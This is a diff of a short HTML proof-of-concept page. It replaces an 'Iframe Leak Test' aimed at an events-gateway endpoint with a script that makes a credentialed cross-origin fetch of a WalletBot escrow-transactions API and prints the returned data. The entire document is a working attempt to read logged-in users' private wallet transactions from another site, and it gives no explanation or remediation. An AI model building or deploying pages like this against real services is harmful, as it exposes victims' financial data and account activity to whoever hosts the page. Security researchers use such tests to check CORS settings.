@@ -1,36 +1,19 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <title>Iframe Leak Test</title>
-</head>
 <body>
-  <h2>Trying to load JSON data in iframe</h2>
-
-  <!-- Load JSON endpoint in iframe (won't be readable due to CORS) -->
-  <iframe src="https://events-gateway.walletteam.org/v2/meter?alt=json-in-script" width="100%" height="300"></iframe>
-
-  <h3>Fetch API Response (logged below)</h3>
+  <h3>Fetch WalletBot Data</h3>
   <pre id="output">Loading...</pre>
 
   <script>
-    // Try to fetch the JSON endpoint
-    fetch("https://events-gateway.walletteam.org/v2/meter", {
-      credentials: "include",
-      headers: {
-        "Accept": "application/javascript"
-      }
+    fetch("https://walletbot.me/scwapi/escrow/transactions?perPage=200", {
+      credentials: "include"
     })
-    .then(response => {
-      document.getElementById("output").textContent += `\nStatus: ${response.status} ${response.statusText}`;
-      return response.text();
+    .then(r => r.text())
+    .then(text => {
+      document.getElementById("output").textContent = text;
     })
-    .then(data => {
-      document.getElementById("output").textContent += `\n\nResponse:\n${data}`;
-      console.log("Raw response:", data);
-    })
-    .catch(error => {
-      document.getElementById("output").textContent += `\n\nError: ${error.message}`;
-      console.error("Fetch failed:", error);
+    .catch(err => {
+      document.getElementById("output").textContent = "Error: " + err;
     });
   </script>
 </body>
